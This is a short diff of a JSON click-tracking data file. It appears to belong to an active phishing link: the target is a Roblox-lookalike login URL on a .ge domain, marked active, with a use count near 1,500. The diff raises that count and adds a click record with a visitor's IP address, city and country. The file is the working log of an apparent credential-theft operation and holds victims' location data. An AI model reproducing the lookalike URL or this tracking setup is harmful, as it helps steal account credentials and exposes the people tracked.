@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1506,
+    "useCount": 1507,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12211,6 +12211,14 @@
       },
       {
         "timestamp": 1777444715954,
+        "ip": "124.105.5.141",
+        "country": "Philippines",
+        "city": "Bulacan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777444726382,
         "ip": "124.105.5.141",
         "country": "Philippines",
         "city": "Bulacan",
